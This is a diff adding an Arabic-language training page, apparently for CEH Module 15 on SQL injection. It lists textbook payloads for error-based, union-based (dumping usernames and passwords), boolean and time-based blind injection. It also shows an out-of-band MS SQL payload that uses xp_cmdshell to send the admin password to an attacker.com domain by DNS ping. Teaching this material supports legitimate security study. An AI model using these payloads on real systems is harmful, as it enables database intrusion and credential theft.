@@ -1,0 +1,60 @@
+
+<!-- =======================================================
+     CEH MODULE 15: SQL INJECTION
+     ======================================================= -->
+<div class="meth-content-view" id="meth-content-mod15" style="display:none;" dir="rtl">
+  
+  <div class="cyber-hero">
+    <h2 class="hero-title"><span class="hero-icon">💉</span> SQL Injection (SQLi)</h2>
+    <p class="hero-tagline">حقن قواعد البيانات واستخراج البيانات بطرق مباشرة، عمياء، أو خارج النطاق.</p>
+    <div class="hero-meta">
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-red);"></span> Module 15</span>
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-purple);"></span> Deep Dive</span>
+    </div>
+  </div>
+
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">🗄️</span>
+      <h3>أنواع الحقن وأمثلة البايلودز (SQLi Payloads)</h3>
+    </div>
+    
+    <div class="cyber-card" style="--tool-color: #00e5a0;">
+      <div class="card-header"><h4>1. الحقن المرئي المباشر (In-band SQLi)</h4></div>
+      <p>استخدام نفس القناة لاستقبال النتائج المباشرة.</p>
+      <div class="cmd-block">
+        <div class="cmd-header"><span class="cmd-lang">Error & Union Based</span></div>
+        <pre><code># Error-based (إجبار تحويل نص لرقم لعرض الإصدار)
+' OR 1=CONVERT(int, (SELECT @@version))--
+
+# Union-based (دمج نتائج الاستعلام لسرقة الباسوردات)
+' UNION SELECT username, password FROM users--</code></pre>
+      </div>
+    </div>
+
+    <div class="cyber-card" style="--tool-color: #ffa502;">
+      <div class="card-header"><h4>2. الحقن الاستدلالي (Blind SQLi)</h4></div>
+      <p>لا تظهر أي نتائج، يُستدل على النتيجة بسؤال النظام صح/خطأ.</p>
+      <div class="cmd-block">
+        <div class="cmd-header"><span class="cmd-lang">Boolean & Time Based</span></div>
+        <pre><code># Boolean-based (اختبار صحة شرط بولياني)
+http://example.com/item?id=1 AND 1=1 (TRUE)
+
+# Time-based (إجبار محرك القاعدة على التأخير الزمني - MySQL)
+1' AND SLEEP(10)--</code></pre>
+      </div>
+    </div>
+
+    <div class="cyber-card" style="--tool-color: #ff4757;">
+      <div class="card-header"><h4>3. الحقن خارج النطاق (Out-of-band SQLi)</h4></div>
+      <p>إجبار الخادم على إرسال البيانات المسروقة إلى خادم خارجي (DNS/HTTP) يسيطر عليه المهاجم.</p>
+      <div class="cmd-block">
+        <div class="cmd-header"><span class="cmd-lang">OOB Payload (MS SQL Server)</span></div>
+        <pre><code>'; DECLARE @data varchar(255); 
+SELECT @data=password FROM users WHERE username='admin'; 
+EXEC master..xp_cmdshell 'ping ' + @data + '.attacker.com';--</code></pre>
+      </div>
+    </div>
+  </div>
+
+</div>
